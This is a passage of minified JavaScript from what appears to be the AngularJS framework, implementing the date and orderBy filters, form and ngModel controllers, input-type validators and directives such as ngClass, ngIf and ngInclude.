e=/^(\d{4})-?(\d\d)-?(\d\d)(?:T(\d\d)(?::?(\d\d)(?::?(\d\d)(?:\.(\d+))?)?)?(Z|([+-])(\d\d):?(\d\d))?)?$/;return function(i,r,n){var s,o,a="",l=[];if(r=r||"mediumDate",r=t.DATETIME_FORMATS[r]||r,U(i)&&(i=kn.test(i)?k(i):function(t){var i;if(i=t.match(e)){var r=new Date(0),n=0,s=0,o=i[8]?r.setUTCFullYear:r.setFullYear,a=i[8]?r.setUTCHours:r.setHours;i[9]&&(n=k(i[9]+i[10]),s=k(i[9]+i[11])),o.call(r,k(i[1]),k(i[2])-1,k(i[3]));var l=k(i[4]||0)-n,h=k(i[5]||0)-s,c=k(i[6]||0),u=Math.round(1e3*parseFloat("0."+(i[7]||0)));return a.call(r,l,h,c,u),r}return t}(i)),W(i)&&(i=new Date(i)),!H(i)||!isFinite(i.getTime()))return i;for(;r;)(o=xn.exec(r))?r=(l=ut(l,o,1)).pop():(l.push(r),r=null);var h=i.getTimezoneOffset();return n&&(h=vt(n,h),i=bt(i,n,!0)),S(l,(function(e){a+=(s=Pn[e])?s(i,t.DATETIME_FORMATS,h):"''"===e?"'":e.replace(/(^'|'$)/g,"").replace(/''/g,"'")})),a}}function Mn(){return function(t,e){return F(e)&&(e=2),ft(t,e)}}On.$inject=["$locale"];var Dn=L(d),Rn=L(p);function Ln(){return function(t,e,i){return e=Math.abs(Number(e))===1/0?Number(e):k(e),O(e)||(W(t)&&(t=t.toString()),!E(t))?t:(i=(i=!i||isNaN(i)?0:k(i))<0?Math.max(0,t.length+i):i,e>=0?Nn(t,i,i+e):0===i?Nn(t,e,t.length):Nn(t,Math.max(0,i+e),i))}}function Nn(t,e,i){return U(t)?t.slice(e,i):m.call(t,e,i)}function Fn(t){return function(r,s,o,a){if(null==r)return r;if(!E(r))throw n("orderBy")("notarray","Expected array but received: {0}",r);G(s)||(s=[s]),0===s.length&&(s=["+"]);var l=function(e){return e.map((function(e){var i=1,r=R;if(j(e))r=e;else if(U(e)&&(("+"===e.charAt(0)||"-"===e.charAt(0))&&(i="-"===e.charAt(0)?-1:1,e=e.substring(1)),""!==e&&(r=t(e)).constant)){var n=r();r=function(t){return t[n]}}return{get:r,descending:i}}))}(s),h=o?-1:1,c=j(a)?a:i,u=Array.prototype.map.call(r,(function(t,i){return{value:t,tieBreaker:{value:i,type:"number",index:i},predicateValues:l.map((function(r){return function(t,i){var r=typeof t;return null===t?r="null":"object"===r&&(t=function(t){return j(t.valueOf)&&e(t=t.valueOf())||N(t)&&e(t=t.toString()),t}(t)),{value:t,type:r,index:i}}(r.get(t),i)}))}}));return u.sort((function(t,e){for(var r=0,n=l.length;r<n;r++){var s=c(t.predicateValues[r],e.predicateValues[r]);if(s)return s*l[r].descending*h}return(c(t.tieBreaker,e.tieBreaker)||i(t.tieBreaker,e.tieBreaker))*h})),r=u.map((function(t){return t.value}))};function e(t){switch(typeof t){case"number":case"boolean":case"string":return!0;default:return!1}}function i(t,e){var i=0,r=t.type,n=e.type;if(r===n){var s=t.value,o=e.value;"string"===r?(s=s.toLowerCase(),o=o.toLowerCase()):"object"===r&&(q(s)&&(s=t.index),q(o)&&(o=e.index)),s!==o&&(i=s<o?-1:1)}else i="undefined"===r?1:"undefined"===n?-1:"null"===r?1:"null"===n||r<n?-1:1;return i}}function Vn(t){return j(t)&&(t={link:t}),t.restrict=t.restrict||"AC",L(t)}Fn.$inject=["$parse"];var qn=L({restrict:"E",compile:function(t,e){if(!e.href&&!e.xlinkHref)return function(t,e){if("a"===e[0].nodeName.toLowerCase()){var i="[object SVGAnimatedString]"===y.call(e.prop("href"))?"xlink:href":"href";e.on("click",(function(t){e.attr(i)||t.preventDefault()}))}}}}),Bn={};S(Oe,(function(t,e){if("multiple"!==t){var i=bi("ng-"+e),r=n;"checked"===t&&(r=function(t,e,r){r.ngModel!==r[i]&&n(t,0,r)}),Bn[i]=function(){return{restrict:"A",priority:100,link:r}}}function n(t,r,n){t.$watch(n[i],(function(t){n.$set(e,!!t)}))}})),S(De,(function(t,e){Bn[e]=function(){return{priority:100,link:function(t,i,r){if("ngPattern"===e&&"/"===r.ngPattern.charAt(0)){var n=r.ngPattern.match(h);if(n)return void r.$set("ngPattern",new RegExp(n[1],n[2]))}t.$watch(r[e],(function(t){r.$set(e,t)}))}}}})),S(["src","srcset","href"],(function(t){var e=bi("ng-"+t);Bn[e]=["$sce",function(i){return{priority:99,link:function(r,n,o){var a=t,l=t;"href"===t&&"[object SVGAnimatedString]"===y.call(n.prop("href"))&&(l="xlinkHref",o.$attr[l]="xlink:href",a=null),o.$set(e,i.getTrustedMediaUrl(o[e])),o.$observe(e,(function(e){e?(o.$set(l,e),s&&a&&n.prop(a,o[l])):"href"===t&&o.$set(l,null)}))}}}]}));var Un={$addControl:D,$getControls:L([]),$$renameControl:function(t,e){t.$name=e},$removeControl:D,$setValidity:D,$setDirty:D,$setPristine:D,$setSubmitted:D,$$setSubmitted:D},Wn="ng-pending",Hn="ng-submitted";function Gn(t,e,i,r,n){this.$$controls=[],this.$error={},this.$$success={},this.$pending=void 0,this.$name=n(e.name||e.ngForm||"")(i),this.$dirty=!1,this.$pristine=!0,this.$valid=!0,this.$invalid=!1,this.$submitted=!1,this.$$parentForm=Un,this.$$element=t,this.$$animate=r,Xn(this)}Gn.$inject=["$element","$attrs","$scope","$animate","$interpolate"],Gn.prototype={$rollbackViewValue:function(){S(this.$$controls,(function(t){t.$rollbackViewValue()}))},$commitViewValue:function(){S(this.$$controls,(function(t){t.$commitViewValue()}))},$addControl:function(t){Ft(t.$name,"input"),this.$$controls.push(t),t.$name&&(this[t.$name]=t),t.$$parentForm=this},$getControls:function(){return Wt(this.$$controls)},$$renameControl:function(t,e){var i=t.$name;this[i]===t&&delete this[i],this[e]=t,t.$name=e},$removeControl:function(t){t.$name&&this[t.$name]===t&&delete this[t.$name],S(this.$pending,(function(e,i){this.$setValidity(i,null,t)}),this),S(this.$error,(function(e,i){this.$setValidity(i,null,t)}),this),S(this.$$success,(function(e,i){this.$setValidity(i,null,t)}),this),st(this.$$controls,t),t.$$parentForm=Un},$setDirty:function(){this.$$animate.removeClass(this.$$element,Hs),this.$$animate.addClass(this.$$element,Gs),this.$dirty=!0,this.$pristine=!1,this.$$parentForm.$setDirty()},$setPristine:function(){this.$$animate.setClass(this.$$element,Hs,Gs+" "+Hn),this.$dirty=!1,this.$pristine=!0,this.$submitted=!1,S(this.$$controls,(function(t){t.$setPristine()}))},$setUntouched:function(){S(this.$$controls,(function(t){t.$setUntouched()}))},$setSubmitted:function(){for(var t=this;t.$$parentForm&&t.$$parentForm!==Un;)t=t.$$parentForm;t.$$setSubmitted()},$$setSubmitted:function(){this.$$animate.addClass(this.$$element,Hn),this.$submitted=!0,S(this.$$controls,(function(t){t.$$setSubmitted&&t.$$setSubmitted()}))}},Qn({clazz:Gn,set:function(t,e,i){var r=t[e];r?-1===r.indexOf(i)&&r.push(i):t[e]=[i]},unset:function(t,e,i){var r=t[e];!r||(st(r,i),0===r.length&&delete t[e])}});var zn=function(t){return["$timeout","$parse",function(e,i){return{name:"form",restrict:t?"EAC":"E",require:["form","^^?form"],controller:Gn,compile:function(i,n){i.addClass(Hs).addClass(Us);var s=n.name?"name":!(!t||!n.ngForm)&&"ngForm";return{pre:function(t,i,n,o){var a=o[0];if(!("action"in n)){var l=function(e){t.$apply((function(){a.$commitViewValue(),a.$setSubmitted()})),e.preventDefault()};i[0].addEventListener("submit",l),i.on("$destroy",(function(){e((function(){i[0].removeEventListener("submit",l)}),0,!1)}))}(o[1]||a.$$parentForm).$addControl(a);var h=s?r(a.$name):D;s&&(h(t,a),n.$observe(s,(function(e){a.$name!==e&&(h(t,void 0),a.$$parentForm.$$renameControl(a,e),(h=r(a.$name))(t,a))}))),i.on("$destroy",(function(){a.$$parentForm.$removeControl(a),h(t,void 0),P(a,Un)}))}}}};function r(t){return""===t?i('this[""]').assign:i(t).assign||D}}]},jn=zn(),Yn=zn(!0);function Xn(t){t.$$classCache={},t.$$classCache[Ws]=!(t.$$classCache[Us]=t.$$element.hasClass(Us))}function Qn(t){var e=t.clazz,i=t.set,r=t.unset;function n(t,e,i){i&&!t.$$classCache[e]?(t.$$animate.addClass(t.$$element,e),t.$$classCache[e]=!0):!i&&t.$$classCache[e]&&(t.$$animate.removeClass(t.$$element,e),t.$$classCache[e]=!1)}function s(t,e,i){e=e?"-"+Mt(e,"-"):"",n(t,Us+e,!0===i),n(t,Ws+e,!1===i)}e.prototype.$setValidity=function(t,e,o){var a;F(e)?function(t,e,r,n){t[e]||(t[e]={}),i(t[e],r,n)}(this,"$pending",t,o):function(t,e,i,n){t[e]&&r(t[e],i,n),Kn(t[e])&&(t[e]=void 0)}(this,"$pending",t,o),K(e)?e?(r(this.$error,t,o),i(this.$$success,t,o)):(i(this.$error,t,o),r(this.$$success,t,o)):(r(this.$error,t,o),r(this.$$success,t,o)),this.$pending?(n(this,Wn,!0),this.$valid=this.$invalid=void 0,s(this,"",null)):(n(this,Wn,!1),this.$valid=Kn(this.$error),this.$invalid=!this.$valid,s(this,"",this.$valid)),s(this,t,a=this.$pending&&this.$pending[t]?void 0:!this.$error[t]&&(!!this.$$success[t]||null)),this.$$parentForm.$setValidity(t,a,this)}}function Kn(t){if(t)for(var e in t)if(t.hasOwnProperty(e))return!1;return!0}var Zn=/^\d{4,}-[01]\d-[0-3]\dT[0-2]\d:[0-5]\d:[0-5]\d\.\d+(?:[+-][0-2]\d:[0-5]\d|Z)$/,Jn=/^[a-z][a-z\d.+-]*:\/*(?:[^:@]+(?::[^@]+)?@)?(?:[^\s:/?#]+|\[[a-f\d:]+])(?::\d+)?(?:\/[^?#]*)?(?:\?[^#]*)?(?:#.*)?$/i,ts=/^(?=.{1,254}$)(?=.{1,64}@)[-!#$%&'*+/0-9=?A-Z^_`a-z{|}~]+(\.[-!#$%&'*+/0-9=?A-Z^_`a-z{|}~]+)*@[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?(\.[A-Za-z0-9]([A-Za-z0-9-]{0,61}[A-Za-z0-9])?)*$/,es=/^\s*(-|\+)?(\d+|(\d*(\.\d*)))([eE][+-]?\d+)?\s*$/,is=/^(\d{4,})-(\d{2})-(\d{2})$/,rs=/^(\d{4,})-(\d\d)-(\d\d)T(\d\d):(\d\d)(?::(\d\d)(\.\d{1,3})?)?$/,ns=/^(\d{4,})-W(\d\d)$/,ss=/^(\d{4,})-(\d\d)$/,os=/^(\d\d):(\d\d)(?::(\d\d)(\.\d{1,3})?)?$/,as=qt();S("date,datetime-local,month,time,week".split(","),(function(t){as[t]=!0}));var ls={text:function(t,e,i,r,n,s){cs(t,e,i,r,n,s),hs(r)},date:ds("date",is,us(is,["yyyy","MM","dd"]),"yyyy-MM-dd"),"datetime-local":ds("datetimelocal",rs,us(rs,["yyyy","MM","dd","HH","mm","ss","sss"]),"yyyy-MM-ddTHH:mm:ss.sss"),time:ds("time",os,us(os,["HH","mm","ss","sss"]),"HH:mm:ss.sss"),week:ds("week",ns,(function(t,e){if(H(t))return t;if(U(t)){ns.lastIndex=0;var i=ns.exec(t);if(i){var r=+i[1],n=+i[2],s=0,o=0,a=0,l=0,h=Tn(r),c=7*(n-1);return e&&(s=e.getHours(),o=e.getMinutes(),a=e.getSeconds(),l=e.getMilliseconds()),new Date(r,0,h.getDate()+c,s,o,a,l)}}return NaN}),"yyyy-Www"),month:ds("month",ss,us(ss,["yyyy","MM"]),"yyyy-MM"),number:function(t,e,i,r,n,s,o,a){var l;if(ps(t,e,i,r,"number"),ms(r),cs(t,e,i,r,n,s),V(i.min)||i.ngMin){var h=i.min||a(i.ngMin)(t);l=fs(h),r.$validators.min=function(t,e){return r.$isEmpty(e)||F(l)||e>=l},i.$observe("min",(function(t){t!==h&&(l=fs(t),h=t,r.$validate())}))}if(V(i.max)||i.ngMax){var c=i.max||a(i.ngMax)(t),u=fs(c);r.$validators.max=function(t,e){return r.$isEmpty(e)||F(u)||e<=u},i.$observe("max",(function(t){t!==c&&(u=fs(t),c=t,r.$validate())}))}if(V(i.step)||i.ngStep){var d=i.step||a(i.ngStep)(t),p=fs(d);r.$validators.step=function(t,e){return r.$isEmpty(e)||F(p)||vs(e,l||0,p)},i.$observe("step",(function(t){t!==d&&(p=fs(t),d=t,r.$validate())}))}},url:function(t,e,i,r,n,s){cs(t,e,i,r,n,s),hs(r),r.$validators.url=function(t,e){var i=t||e;return r.$isEmpty(i)||Jn.test(i)}},email:function(t,e,i,r,n,s){cs(t,e,i,r,n,s),hs(r),r.$validators.email=function(t,e){var i=t||e;return r.$isEmpty(i)||ts.test(i)}},radio:function(t,e,i,r){var n=!i.ngTrim||"false"!==tt(i.ngTrim);F(i.name)&&e.attr("name",T());e.on("change",(function(t){var s;e[0].checked&&(s=i.value,n&&(s=tt(s)),r.$setViewValue(s,t&&t.type))})),r.$render=function(){var t=i.value;n&&(t=tt(t)),e[0].checked=t===r.$viewValue},i.$observe("value",r.$render)},range:function(t,e,i,r,n,s){ps(t,e,i,r,"range"),ms(r),cs(t,e,i,r,n,s);var o=r.$$hasNativeValidators&&"range"===e[0].type,a=o?0:void 0,l=o?100:void 0,h=o?1:void 0,c=e[0].validity,u=V(i.min),d=V(i.max),p=V(i.step),m=r.$render;function f(t,r){e.attr(t,i[t]);var n=i[t];i.$observe(t,(function(t){t!==n&&(n=t,r(t))}))}r.$render=o&&V(c.rangeUnderflow)&&V(c.rangeOverflow)?function(){m(),r.$setViewValue(e.val())}:m,u&&(a=fs(i.min),r.$validators.min=o?function(){return!0}:function(t,e){return r.$isEmpty(e)||F(a)||e>=a},f("min",(function(t){if(a=fs(t),!O(r.$modelValue))if(o){var i=e.val();a>i&&(i=a,e.val(i)),r.$setViewValue(i)}else r.$validate()}))),d&&(l=fs(i.max),r.$validators.max=o?function(){return!0}:function(t,e){return r.$isEmpty(e)||F(l)||e<=l},f("max",(function(t){if(l=fs(t),!O(r.$modelValue))if(o){var i=e.val();l<i&&(e.val(l),i=l<a?a:l),r.$setViewValue(i)}else r.$validate()}))),p&&(h=fs(i.step),r.$validators.step=o?function(){return!c.stepMismatch}:function(t,e){return r.$isEmpty(e)||F(h)||vs(e,a||0,h)},f("step",(function(t){h=fs(t),!O(r.$modelValue)&&(o?r.$viewValue!==e.val()&&r.$setViewValue(e.val()):r.$validate())})))},checkbox:function(t,e,i,r,n,s,o,a){var l=_s(a,t,"ngTrueValue",i.ngTrueValue,!0),h=_s(a,t,"ngFalseValue",i.ngFalseValue,!1);e.on("change",(function(t){r.$setViewValue(e[0].checked,t&&t.type)})),r.$render=function(){e[0].checked=r.$viewValue},r.$isEmpty=function(t){return!1===t},r.$formatters.push((function(t){return lt(t,l)})),r.$parsers.push((function(t){return t?l:h}))},hidden:D,button:D,submit:D,reset:D,file:D};function hs(t){t.$formatters.push((function(e){return t.$isEmpty(e)?e:e.toString()}))}function cs(t,e,i,r,n,s){var o=d(e[0].type);if(!n.android){var a=!1;e.on("compositionstart",(function(){a=!0})),e.on("compositionupdate",(function(t){(F(t.data)||""===t.data)&&(a=!1)})),e.on("compositionend",(function(){a=!1,h()}))}var l,h=function(t){if(l&&(s.defer.cancel(l),l=null),!a){var n=e.val(),h=t&&t.type;"password"!==o&&(!i.ngTrim||"false"!==i.ngTrim)&&(n=tt(n)),(r.$viewValue!==n||""===n&&r.$$hasNativeValidators)&&r.$setViewValue(n,h)}};if(n.hasEvent("input"))e.on("input",h);else{var u=function(t,e,i){l||(l=s.defer((function(){l=null,(!e||e.value!==i)&&h(t)})))};e.on("keydown",(function(t){var e=t.keyCode;91===e||15<e&&e<19||37<=e&&e<=40||u(t,this,this.value)})),n.hasEvent("paste")&&e.on("paste cut drop",u)}e.on("change",h),as[o]&&r.$$hasNativeValidators&&o===i.type&&e.on("keydown wheel mousedown",(function(t){if(!l){var e=this[c],i=e.badInput,r=e.typeMismatch;l=s.defer((function(){l=null,(e.badInput!==i||e.typeMismatch!==r)&&h(t)}))}})),r.$render=function(){var t=r.$isEmpty(r.$viewValue)?"":r.$viewValue;e.val()!==t&&e.val(t)}}function us(t,e){return function(i,r){var n,s;if(H(i))return i;if(U(i)){if('"'===i.charAt(0)&&'"'===i.charAt(i.length-1)&&(i=i.substring(1,i.length-1)),Zn.test(i))return new Date(i);if(t.lastIndex=0,n=t.exec(i)){n.shift(),s=r?{yyyy:r.getFullYear(),MM:r.getMonth()+1,dd:r.getDate(),HH:r.getHours(),mm:r.getMinutes(),ss:r.getSeconds(),sss:r.getMilliseconds()/1e3}:{yyyy:1970,MM:1,dd:1,HH:0,mm:0,ss:0,sss:0},S(n,(function(t,i){i<e.length&&(s[e[i]]=+t)}));var o=new Date(s.yyyy,s.MM-1,s.dd,s.HH,s.mm,s.ss||0,1e3*s.sss||0);return s.yyyy<100&&o.setFullYear(s.yyyy),o}}return NaN}}function ds(t,e,i,r){return function(n,s,o,a,l,h,c,u){ps(n,s,o,a,t),cs(0,s,o,a,l,h);var d,p,m="time"===t||"datetimelocal"===t;if(a.$parsers.push((function(i){return a.$isEmpty(i)?null:e.test(i)?w(i,d):void(a.$$parserName=t)})),a.$formatters.push((function(t){if(t&&!H(t))throw Qs("datefmt","Expected `{0}` to be a date",t);if(_(t)){d=t;var e=a.$options.getOption("timezone");return e&&(p=e,d=bt(d,e,!0)),function(t,e){var i=r;m&&U(a.$options.getOption("timeSecondsFormat"))&&(i=r.replace("ss.sss",a.$options.getOption("timeSecondsFormat")).replace(/:$/,""));var n=c("date")(t,i,e);return m&&a.$options.getOption("timeStripZeroSeconds")&&(n=n.replace(/(?::00)?(?:\.000)?$/,"")),n}(t,e)}return d=null,p=null,""})),V(o.min)||o.ngMin){var f=o.min||u(o.ngMin)(n),g=b(f);a.$validators.min=function(t){return!_(t)||F(g)||i(t)>=g},o.$observe("min",(function(t){t!==f&&(g=b(t),f=t,a.$validate())}))}if(V(o.max)||o.ngMax){var y=o.max||u(o.ngMax)(n),v=b(y);a.$validators.max=function(t){return!_(t)||F(v)||i(t)<=v},o.$observe("max",(function(t){t!==y&&(v=b(t),y=t,a.$validate())}))}function _(t){return t&&!(t.getTime&&t.getTime()!=t.getTime())}function b(t){return V(t)&&!H(t)?w(t)||void 0:t}function w(t,e){var r=a.$options.getOption("timezone");p&&p!==r&&(e=_t(e,vt(p)));var n=i(t,e);return!isNaN(n)&&r&&(n=bt(n,r)),n}}}function ps(t,e,i,r,n){var s=e[0];(r.$$hasNativeValidators=q(s.validity))&&r.$parsers.push((function(t){var i=e.prop(c)||{};if(!i.badInput&&!i.typeMismatch)return t;r.$$parserName=n}))}function ms(t){t.$parsers.push((function(e){return t.$isEmpty(e)?null:es.test(e)?parseFloat(e):void(t.$$parserName="number")})),t.$formatters.push((function(e){if(!t.$isEmpty(e)){if(!W(e))throw Qs("numfmt","Expected `{0}` to be a number",e);e=e.toString()}return e}))}function fs(t){return V(t)&&!W(t)&&(t=parseFloat(t)),O(t)?void 0:t}function gs(t){return(0|t)===t}function ys(t){var e=t.toString(),i=e.indexOf(".");if(-1===i){if(-1<t&&t<1){var r=/e-(\d+)$/.exec(e);if(r)return Number(r[1])}return 0}return e.length-i-1}function vs(t,e,i){var r=Number(t),n=!gs(r),s=!gs(e),o=!gs(i);if(n||s||o){var a=n?ys(r):0,l=s?ys(e):0,h=o?ys(i):0,c=Math.max(a,l,h),u=Math.pow(10,c);r*=u,e*=u,i*=u,n&&(r=Math.round(r)),s&&(e=Math.round(e)),o&&(i=Math.round(i))}return(r-e)%i==0}function _s(t,e,i,r,n){var s;if(V(r)){if(!(s=t(r)).constant)throw Qs("constexpr","Expected constant expression for `{0}`, but saw `{1}`.",i,r);return s(e)}return n}var bs=["$browser","$sniffer","$filter","$parse",function(t,e,i,r){return{restrict:"E",require:["?ngModel"],link:{pre:function(n,s,o,a){a[0]&&(ls[d(o.type)]||ls.text)(n,s,o,a[0],e,t,i,r)}}}}],ws=function(){var t={configurable:!0,enumerable:!1,get:function(){return this.getAttribute("value")||""},set:function(t){this.setAttribute("value",t)}};return{restrict:"E",priority:200,compile:function(e,i){if("hidden"===d(i.type))return{pre:function(e,i,r,n){var s=i[0];s.parentNode&&s.parentNode.insertBefore(s,s.nextSibling),Object.defineProperty&&Object.defineProperty(s,"value",t)}}}}},Es=/^(true|false|\d+)$/,Ss=function(){function t(t,e,i){var r=V(i)?i:9===s?"":null;t.prop("value",r),e.$set("value",i)}return{restrict:"A",priority:100,compile:function(e,i){return Es.test(i.ngValue)?function(e,i,r){t(i,r,e.$eval(r.ngValue))}:function(e,i,r){e.$watch(r.ngValue,(function(e){t(i,r,e)}))}}}},As=["$compile",function(t){return{restrict:"AC",compile:function(e){return t.$$addBindingClass(e),function(e,i,r){t.$$addBindingInfo(i,r.ngBind),i=i[0],e.$watch(r.ngBind,(function(t){i.textContent=Bt(t)}))}}}}],Cs=["$interpolate","$compile",function(t,e){return{compile:function(i){return e.$$addBindingClass(i),function(i,r,n){var s=t(r.attr(n.$attr.ngBindTemplate));e.$$addBindingInfo(r,s.expressions),r=r[0],n.$observe("ngBindTemplate",(function(t){r.textContent=F(t)?"":t}))}}}}],Ts=["$sce","$parse","$compile",function(t,e,i){return{restrict:"A",compile:function(r,n){var s=e(n.ngBindHtml),o=e(n.ngBindHtml,(function(e){return t.valueOf(e)}));return i.$$addBindingClass(r),function(e,r,n){i.$$addBindingInfo(r,n.ngBindHtml),e.$watch(o,(function(){var i=s(e);r.html(t.getTrustedHtml(i)||"")}))}}}}],$s=L({restrict:"A",require:"ngModel",link:function(t,e,i,r){r.$viewChangeListeners.push((function(){t.$eval(i.ngChange)}))}});function Is(t,e){var i;return t="ngClass"+t,["$parse",function(o){return{restrict:"AC",link:function(a,l,h){var c,u=l.data("$classCounts"),d=!0;function p(t,e){var i=[];return S(t,(function(t){(e>0||u[t])&&(u[t]=(u[t]||0)+e,u[t]===+(e>0)&&i.push(t))})),i.join(" ")}u||(u=qt(),l.data("$classCounts",u)),"ngClass"!==t&&(i||(i=o("$index",(function(t){return 1&t}))),a.$watch(i,(function(t){t===e?function(t){t=p(n(t),1),h.$addClass(t)}(c):function(t){t=p(n(t),-1),h.$removeClass(t)}(c),d=t}))),a.$watch(o(h[t],s),(function(t){d===e&&function(t,e){var i=n(t),s=n(e),o=r(i,s),a=r(s,i),l=p(o,-1),c=p(a,1);h.$addClass(c),h.$removeClass(l)}(c,t),c=t}))}}}];function r(t,e){if(!t||!t.length)return[];if(!e||!e.length)return t;var i=[];t:for(var r=0;r<t.length;r++){for(var n=t[r],s=0;s<e.length;s++)if(n===e[s])continue t;i.push(n)}return i}function n(t){return t&&t.split(" ")}function s(t){if(!t)return t;var e=t;return G(t)?e=t.map(s).join(" "):q(t)?e=Object.keys(t).filter((function(e){return t[e]})).join(" "):U(t)||(e=t+""),e}}var Ps=Is("",!0),xs=Is("Odd",0),ks=Is("Even",1),Os=Vn({compile:function(t,e){e.$set("ngCloak",void 0),t.removeClass("ng-cloak")}}),Ms=[function(){return{restrict:"A",scope:!0,controller:"@",priority:500}}],Ds={},Rs={blur:!0,focus:!0};function Ls(t,e,i,r,n,s){return{restrict:"A",compile:function(o,a){var l=t(a[r]);return function(t,r){r.on(n,(function(r){var n=function(){l(t,{$event:r})};if(e.$$phase)if(s)t.$evalAsync(n);else try{n()}catch(t){i(t)}else t.$apply(n)}))}}}}S("click dblclick mousedown mouseup mouseover mouseout mousemove mouseenter mouseleave keydown keyup keypress submit focus blur copy cut paste".split(" "),(function(t){var e=bi("ng-"+t);Ds[e]=["$parse","$rootScope","$exceptionHandler",function(i,r,n){return Ls(i,r,n,e,t,Rs[t])}]}));var Ns=["$animate","$compile",function(t,e){return{multiElement:!0,transclude:"element",priority:600,terminal:!0,restrict:"A",$$tlb:!0,link:function(i,r,n,s,o){var a,l,h;i.$watch(n.ngIf,(function(i){i?l||o((function(i,s){l=s,i[i.length++]=e.$$createComment("end ngIf",n.ngIf),a={clone:i},t.enter(i,r.parent(),r)})):(h&&(h.remove(),h=null),l&&(l.$destroy(),l=null),a&&(h=Vt(a.clone),t.leave(h).done((function(t){!1!==t&&(h=null)})),a=null))}))}}}],Fs=["$templateRequest","$anchorScroll","$animate",function(t,e,i){return{restrict:"ECA",priority:400,terminal:!0,transclude:"element",controller:b.noop,compile:function(r,n){var s=n.ngInclude||n.src,o=n.onload||"",a=n.autoscroll;return function(r,n,l,h,c){var u,d,p,m=0,f=function(){d&&(d.remove(),d=null),u&&(u.$destroy(),u=null),p&&(i.leave(p).done((function(t){!1!==t&&(d=null)})),d=p,p=null)};r.$watch(s,(function(s){var l=function(t){!1!==t&&V(a)&&(!a||r.$eval(a))&&e()},d=++m;s?(t(s,!0).then((function(t){if(!r.$$destroyed&&d===m){var e=r.$new();h.template=t;var a=c(e,(function(t){f(),i.enter(t,null,n).done(l)}));p=a,(u=e).$emit("$includeContentLoaded",s),r.$eval(o)}}),(function(){r.$$destroyed||d===m&&(f(),r.$emit("$includeContentError",s))})),r.$emit("$includeContentRequested",s)):(f(),h.template=null)}))}}}}],Vs=["$compile",function(e){return{restrict:"ECA",priority:-400,require:"ngInclude",link:function(i,r,n,s){if(y.call(r[0]).match(/SVG/))return r.empty(),void e(ue(s.template,t.document).childNodes)(i,(function(t){r.append(t)}),{futureParentElement:r});r.html(s.template),e(r.contents())(i)}}}],qs=Vn({priority:450,compile:function(){return{pre:function(t,e,i){t.$eval(i.ngInit)}}}}),Bs=function(){return{restrict:"A",priority:100,require:"ngModel",link:function(t,e,i,r){var n=i.ngList||", ",s="false"!==i.ngTrim,o=s?tt(n):n;r.$parsers.push((function(t){if(!F(t)){var e=[];return t&&S(t.split(o),(function(t){t&&e.push(s?tt(t):t)})),e}})),r.$formatters.push((function(t){if(G(t))return t.join(n)})),r.$isEmpty=function(t){return!t||!t.length}}}},Us="ng-valid",Ws="ng-invalid",Hs="ng-pristine",Gs="ng-dirty",zs="ng-untouched",js="ng-touched",Ys="ng-empty",Xs="ng-not-empty",Qs=n("ngModel");function Ks(t,e,i,r,n,s,o,a,l){this.$viewValue=Number.NaN,this.$modelValue=Number.NaN,this.$$rawModelValue=void 0,this.$validators={},this.$asyncValidators={},this.$parsers=[],this.$formatters=[],this.$viewChangeListeners=[],this.$untouched=!0,this.$touched=!1,this.$pristine=!0,this.$dirty=!1,this.$valid=!0,this.$invalid=!1,this.$error={},this.$$success={},this.$pending=void 0,this.$name=l(i.name||"",!1)(t),this.$$parentForm=Un,this.$options=Zs,this.$$updateEvents="",this.$$updateEventHandler=this.$$updateEventHandler.bind(this),this.$$parsedNgModel=n(i.ngModel),this.$$parsedNgModelAssign=this.$$parsedNgModel.assign,this.$$ngModelGet=this.$$parsedNgModel,this.$$ngModelSet=this.$$parsedNgModelAssign,this.$$pendingDebounce=null,this.$$parserValid=void 0,this.$$parserName="parse",this.$$currentValidationRunId=0,this.$$scope=t,this.$$rootScope=t.$root,this.$$attr=i,this.$$element=r,this.$$animate=s,this.$$timeout=o,this.$$parse=n,this.$$q=a,this.$$exceptionHandler=e,Xn(this),function(t){t.$$scope.$watch((function(e){var i=t.$$ngModelGet(e);return i!==t.$modelValue&&(t.$modelValue==t.$modelValue||i==i)&&t.$$setModelValue(i),i}))}(this)}Ks.$inject=["$scope","$exceptionHandler","$attrs","$element","$parse","$animate","$timeout","$q","$interpolate"],Ks.prototype={$$initGetterSetters:function(){if(this.$options.getOption("getterSetter")){var t=this.$$parse(this.$$attr.ngModel+"()"),e=this.$$parse(this.$$attr.ngModel+"($$$p)");this.$$ngModelGet=function(e){var i=this.$$parsedNgModel(e);return j(i)&&(i=t(e)),i},this.$$ngModelSet=function(t,i){j(this.$$parsedNgModel(t))?e(t,{$$$p:i}):this.$$parsedNgModelAssign(t,i)}}else if(!this.$$parsedNgModel.assign)throw Qs("nonassign","Expression '{0}' is non-assignable. Element: {1}",this.$$attr.ngModel,wt(this.$$element))},$render:D,$isEmpty:function(t){return F(t)||""===t||null===t||t!=t},$$updateEmptyClasses:function(t){this.$isEmpty(t)?(this.$$animate.removeClass(this.$$element,Xs),this.$$animate.addClass(this.$$element,Ys)):(this.$$animate.removeClass(this.$$element,Ys),this.$$animate.addClass(this.$$element,Xs))},$setPristine:function(){this.$dirty=!1,this.$pristine=!0,this.$$animate.removeClass(this.$$element,Gs),this.$$animate.addClass(this.$$element,Hs)},$setDirty:function(){this.$dirty=!0,this.$pristine=!1,this.$$animate.removeClass(this.$$element,Hs),this.$$animate.addClass(this.$$element,Gs),this.$$parentForm.$setDirty()},$setUntouched:function(){this.$touched=!1,this.$untouched=!0,this.$$animate.setClass(this.$$element,zs,js)},$setTouched:function(){this.$touched=!0,this.$untouched=!1,this.$$animate.setClass(this.$$element,js,zs)},$rollbackViewValue:function(){this.$$timeout.cancel(this.$$pendingDebounce),this.$viewValue=this.$$lastCommittedViewValue,this.$render()},$validate:function(){if(!O(this.$modelValue)){var t=this.$$lastCommittedViewValue,e=this.$$rawModelValue,i=this.$valid,r=this.$modelValue,n=this.$options.getOption("allowInvalid"),s=this;this.$$runValidators(e,t,(function(t){!n&&i!==t&&(s.$modelValue=t?e:void 0,s.$modelValue!==r&&s.$$writeModelToScope())}))}},$$runValidators:function(t,e,i){this.$$currentValidationRunId++;var r,n=this.$$currentValidationRunId,s=this;(function(){var t=s.$$parserName;if(!F(s.$$parserValid))return s.$$parserValid||(S(s.$validators,(function(t,e){o(e,null)})),S(s.$asyncValidators,(function(t,e){o(e,null)}))),o(t,s.$$parserValid),s.$$parserValid;o(t,null);return!0})()?(r=!0,S(s.$validators,(function(i,n){var 